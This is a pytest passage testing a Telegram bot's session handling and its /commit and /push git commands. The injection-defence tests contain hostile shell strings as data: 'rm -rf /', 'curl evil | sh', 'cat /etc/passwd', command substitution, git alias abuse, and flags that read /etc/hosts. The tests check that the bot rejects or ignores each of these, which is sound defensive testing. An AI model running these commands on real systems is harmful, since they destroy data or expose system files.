    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="keep going")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    state = store.get_chat_state("bot-a", 123)
    assert state["active_session_id"] == "sess_rotated"
    assert "sess_rotated" in state["sessions"]
    assert "sess_original" in state["sessions"]
    assert state["sessions"]["sess_rotated"]["name"] == "rotating-session-1"
    assert "Resume succeeded, but the session ID changed." in bot.messages[1][1]
    assert "New session ID: sess_rotated" in bot.messages[1][1]
    assert "New session name: rotating-session-1" in bot.messages[1][1]


def test_invalid_resume_recovery_creates_new_session_and_switches_active_session(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = ResumeReplacementRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_original", "recover-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="keep going")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    state = store.get_chat_state("bot-a", 123)
    assert state["active_session_id"] == "sess_abc123"
    assert "sess_original" in state["sessions"]
    assert state["sessions"]["sess_abc123"]["name"] == "recover-session-1"
    assert "Resume failed, so a new session was created." in bot.messages[1][1]
    assert "New session ID: sess_abc123" in bot.messages[1][1]
    assert "New session name: recover-session-1" in bot.messages[1][1]


def test_invalid_resume_recovery_uses_next_available_suffix_for_new_session_name(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = ResumeReplacementRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_original", "recover-session", "backend", "codex")
    store.create_session("bot-a", 123, "sess_existing", "recover-session-1", "backend", "codex")
    store.switch_session("bot-a", 123, "sess_original")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="keep going")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    state = store.get_chat_state("bot-a", 123)
    assert state["active_session_id"] == "sess_abc123"
    assert state["sessions"]["sess_abc123"]["name"] == "recover-session-2"


def test_active_session_reports_stalled_agent_process(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = StallingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_stall", "stall-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="continue")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    assert any("The current agent run appears stuck." in message[1] for message in bot.messages)
    assert any("hidden permission dialog" in message[1] for message in bot.messages)


def test_assistant_output_is_chunked_by_rendered_html_length(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = LongEscapedMarkdownRunner()
    cfg = make_config(tmp_path)
    cfg = AppConfig(**{**cfg.__dict__, "max_telegram_message_length": 160})
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_html", "html-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="show long html")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    assert all(len(message[1]) <= cfg.max_telegram_message_length for message in bot.messages[1:])


def test_unsupported_message_type_is_rejected(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(text=None, photo=None, video=object()),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_unsupported_message(update, context))

    assert "This bot currently accepts only text messages and photos." in bot.messages[-1][1]


def _make_commit_router(tmp_path: Path, *, git_manager=None, trusted: bool = True) -> tuple[CommandRouter, Path]:
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    cfg = AppConfig(**{**cfg.__dict__, "enable_commit_command": True})
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_commit", "commit-session", "backend", "codex")
    if trusted:
        store.trust_project("backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = git_manager or FakeGitManager(is_git_repo=True)
    router.runtime.git = router.git
    return router, backend


def _run_commit_command(router: CommandRouter, raw: str) -> FakeBot:
    update = make_update(text=raw)
    bot = FakeBot()
    context = SimpleNamespace(args=raw.split()[1:], bot=bot)
    asyncio.run(router.handle_commit(update, context))
    return bot


def _run_push_command(router: CommandRouter) -> FakeBot:
    update = make_update(text="/push")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    asyncio.run(router.handle_push(update, context))
    return bot


def test_commit_executes_only_valid_git_commands_and_ignores_non_git_segments(tmp_path: Path):
    router, backend = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[
                SimpleNamespace(success=True, message="git add completed."),
                SimpleNamespace(success=True, message="git commit completed.", stdout="[telegram-enhance 5b9a263] safe"),
            ],
        ),
    )

    bot = _run_commit_command(router, '/commit git add -u && rm -rf / && git commit -m "safe"')

    assert router.git.safe_git_commands == [
        (backend, ["add", "-u"]),
        (backend, ["commit", "-m", "safe", "--no-verify", "--no-post-rewrite", "--no-gpg-sign"]),
    ]
    assert router.git.git_commands == []
    assert bot.messages[-1][1].startswith('<pre><code class="language-bash">')
    assert f"${shlex.join(['git', 'add', '-u'])}" in bot.messages[-1][1]
    assert html.escape(
        f"${shlex.join(['git', 'commit', '-m', 'safe', '--no-verify', '--no-post-rewrite', '--no-gpg-sign'])}"
    ) in bot.messages[-1][1]
    assert "---------------" in bot.messages[-1][1]
    assert "[Completed]" in bot.messages[-1][1]
    assert "[telegram-enhance 5b9a263] safe" in bot.messages[-1][1]
    assert "Ignored non-git commands:" in bot.messages[-1][1]
    assert "- rm -rf /" in bot.messages[-1][1]


def test_commit_is_rejected_when_disabled(tmp_path: Path):
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_commit", "commit-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True)

    bot = _run_commit_command(router, "/commit git status")

    assert "/commit is disabled." in bot.messages[-1][1]
    assert router.git.safe_git_commands == []


def test_commit_rejects_git_global_option_prefix(tmp_path: Path):
    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))

    bot = _run_commit_command(router, '/commit git -c alias.x=!echo hacked commit -m "x"')

    assert router.git.safe_git_commands == []
    assert "No valid git commit commands were found." in bot.messages[-1][1]


def test_commit_ignores_multiple_shell_injection_patterns(tmp_path: Path):
    cases = [
        ('/commit git status; python exploit.py; git add -u', ("python exploit.py",)),
        ('/commit git status&&rm -rf /&&git add -u', ("rm -rf /",)),
        ('/commit git status | cat /etc/passwd | git add -u', ("cat /etc/passwd",)),
        ('/commit git status & curl evil | sh & git add -u', ("curl evil", "sh")),
        ('/commit git status > /tmp/out && git add -u', ("/tmp/out",)),
        ('/commit git status >> /tmp/out && git add -u', ("/tmp/out",)),
        ('/commit git status < /tmp/in && git add -u', ("/tmp/in",)),
        ('/commit git status\nrm -rf /\ngit add -u', ("rm -rf /",)),
        ('/commit git status; $(touch /tmp/pwned); git add -u', ("$(touch /tmp/pwned)",)),
        ('/commit git status && `whoami` && git add -u', ("`whoami`",)),
        ('/commit git status && env VAR=1 python exploit.py && git add -u', ("env VAR=1 python exploit.py",)),
        ('/commit python exploit.py && git status && git add -u', ("python exploit.py",)),
    ]
    router, backend = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[
                SimpleNamespace(success=True, message="git status completed."),
                SimpleNamespace(success=True, message="git add completed."),
            ]
            * len(cases),
        ),
    )

    for raw, ignored_fragments in cases:
        bot = _run_commit_command(router, raw)

        assert router.git.safe_git_commands[-2:] == [
            (backend, ["status"]),
            (backend, ["add", "-u"]),
        ]
        for fragment in ignored_fragments:
            assert fragment in bot.messages[-1][1]
        assert "Ignored non-git commands:" in bot.messages[-1][1]


def test_commit_rejects_malformed_or_prefixed_non_git_commands(tmp_path: Path):
    cases = [
        '/commit "unterminated',
        '/commit env VAR=1 git status',
        '/commit git status git commit -m "oops"',
        '/commit git status git diff -- README.md',
        '/commit git status git push origin main',
        '/commit git add --pathspec-from-file /etc/hosts',
        '/commit git add --pathspec-from-file=/etc/hosts',
        '/commit git add --pathspec-from-f=/etc/hosts',
        '/commit git commit -F /etc/hosts',
        '/commit git commit -F/etc/hosts',
        '/commit git commit --file=/etc/hosts',
        '/commit git commit --allow-empty --fil=/etc/hosts',
        '/commit git commit --templ=/etc/hosts',
        '/commit git diff -- README.md',
        '/commit git diff --no-index /etc/passwd /dev/null',
    ]
    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))

    for raw in cases:
        bot = _run_commit_command(router, raw)

        assert router.git.safe_git_commands == []
        assert "No valid git commit commands were found." in bot.messages[-1][1]


def test_commit_allows_adjacent_valid_git_commands_without_spaces(tmp_path: Path):
    router, backend = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[
                SimpleNamespace(success=True, message="git status completed."),
                SimpleNamespace(success=True, message="git add completed."),
            ],
        ),
    )

    bot = _run_commit_command(router, '/commit git status&&git add -u')

    assert router.git.safe_git_commands == [
        (backend, ["status"]),
        (backend, ["add", "-u"]),
    ]
    assert bot.messages[-1][1].startswith('<pre><code class="language-bash">')
    assert f"${shlex.join(['git', 'status'])}" in bot.messages[-1][1]
    assert f"${shlex.join(['git', 'add', '-u'])}" in bot.messages[-1][1]
    assert "[Completed]" in bot.messages[-1][1]
    assert "Ignored non-git commands:" not in bot.messages[-1][1]


def test_commit_allows_common_safe_short_forms(tmp_path: Path):
    router, backend = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[
                SimpleNamespace(success=True, message="git status completed."),
                SimpleNamespace(success=True, message="git commit completed."),
            ],
        ),
    )

    bot = _run_commit_command(router, '/commit git status -sb&&git commit -msafe')

    assert router.git.safe_git_commands == [
        (backend, ["status", "-sb"]),
        (backend, ["commit", "-msafe", "--no-verify", "--no-post-rewrite", "--no-gpg-sign"]),
    ]
    assert f"${shlex.join(['git', 'status', '-sb'])}" in bot.messages[-1][1]
    assert html.escape(
        f"${shlex.join(['git', 'commit', '-msafe', '--no-verify', '--no-post-rewrite', '--no-gpg-sign'])}"
    ) in bot.messages[-1][1]
    assert "[Completed]" in bot.messages[-1][1]


def test_commit_inserts_enforced_flags_before_pathspec_separator(tmp_path: Path):
    router, backend = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[SimpleNamespace(success=True, message="git commit completed.")],
        ),
    )

    bot = _run_commit_command(router, '/commit git commit -m "safe" -- tracked.txt')

    assert router.git.safe_git_commands == [
        (
            backend,
            ["commit", "-m", "safe", "--no-verify", "--no-post-rewrite", "--no-gpg-sign", "--", "tracked.txt"],
        ),
    ]
    assert html.escape(
        f"${shlex.join(['git', 'commit', '-m', 'safe', '--no-verify', '--no-post-rewrite', '--no-gpg-sign', '--', 'tracked.txt'])}"
    ) in bot.messages[-1][1]
    assert "[Completed]" in bot.messages[-1][1]


def test_commit_inserts_enforced_flags_before_implicit_pathspec(tmp_path: Path):
    router, backend = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[SimpleNamespace(success=True, message="git commit completed.")],
        ),
    )

    bot = _run_commit_command(router, '/commit git commit -m "safe" tracked.txt')

    assert router.git.safe_git_commands == [
        (
            backend,
            ["commit", "-m", "safe", "--no-verify", "--no-post-rewrite", "--no-gpg-sign", "tracked.txt"],
        ),
    ]
    assert html.escape(
        f"${shlex.join(['git', 'commit', '-m', 'safe', '--no-verify', '--no-post-rewrite', '--no-gpg-sign', 'tracked.txt'])}"
    ) in bot.messages[-1][1]
    assert "[Completed]" in bot.messages[-1][1]


def test_commit_allows_shell_like_text_inside_quoted_pathspec(tmp_path: Path):
    router, backend = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[SimpleNamespace(success=True, message="git add completed.")],
        ),
    )

    bot = _run_commit_command(router, '/commit git add "file && keep | chars > literally.txt"')

    assert router.git.safe_git_commands == [
        (backend, ["add", "file && keep | chars > literally.txt"]),
    ]
    assert bot.messages[-1][1].startswith('<pre><code class="language-bash">')
    assert html.escape(f"${shlex.join(['git', 'add', 'file && keep | chars > literally.txt'])}") in bot.messages[-1][1]
    assert "[Completed]" in bot.messages[-1][1]
    assert "Ignored non-git commands:" not in bot.messages[-1][1]


def test_commit_reports_missing_project_folder_before_git_calls(tmp_path: Path):
    router, backend = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))
    backend.rmdir()

    bot = _run_commit_command(router, "/commit git status")

    assert router.git.safe_git_commands == []
    assert "Project folder no longer exists for this session: backend" in bot.messages[-1][1]


def test_commit_rejects_parent_path_escape(tmp_path: Path):
    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))

    bot = _run_commit_command(router, "/commit git add ../secret.txt")

    assert router.git.safe_git_commands == []
    assert "Unsafe path arguments are not allowed." in bot.messages[-1][1]


def test_commit_rejects_absolute_paths(tmp_path: Path):
    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))

    bot = _run_commit_command(router, "/commit git commit -m safe -- /etc/passwd")

    assert router.git.safe_git_commands == []
    assert "Unsafe path arguments are not allowed." in bot.messages[-1][1]


def test_commit_rejects_pathspec_magic(tmp_path: Path):
    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))

    bot = _run_commit_command(router, "/commit git status -- :(top)README.md")

    assert router.git.safe_git_commands == []
    assert "Unsafe path arguments are not allowed." in bot.messages[-1][1]


def test_commit_rejects_mutating_git_commands_for_untrusted_project(tmp_path: Path):
    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True), trusted=False)

    bot = _run_commit_command(router, "/commit git add -u && git commit -m safe")

    assert router.git.safe_git_commands == []
    assert "This project is not trusted for mutating git operations." in bot.messages[-1][1]


def test_commit_allows_status_for_untrusted_project(tmp_path: Path):
    router, backend = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[SimpleNamespace(success=True, message="git status completed.")],
        ),
        trusted=False,
    )

    bot = _run_commit_command(router, "/commit git status")

    assert router.git.safe_git_commands == [
        (backend, ["status"]),
    ]
    assert "[Completed]" in bot.messages[-1][1]


def test_push_uses_current_session_branch(tmp_path: Path):
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_push", "push-session", "backend", "codex", branch_name="feature-1")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="feature-1",
        push_result=SimpleNamespace(success=True, message="Pushed branch 'feature-1' to origin.", current_branch="feature-1"),
    )
    router.runtime.git = router.git

    bot = _run_push_command(router)

    assert router.git.push_calls == [(backend, "feature-1")]
    assert bot.messages[-1][1].startswith('<pre><code class="language-bash">')
    assert f"${shlex.join(['git', 'push', 'origin', 'feature-1'])}" in bot.messages[-1][1]
    assert "[Completed]" in bot.messages[-1][1]


def test_push_reports_missing_project_folder_before_git_calls(tmp_path: Path):
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_push", "push-session", "backend", "codex", branch_name="feature-1")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="feature-1")
    router.runtime.git = router.git
    backend.rmdir()

    bot = _run_push_command(router)

    assert router.git.push_calls == []
    assert "Project folder no longer exists for this session: backend" in bot.messages[-1][1]
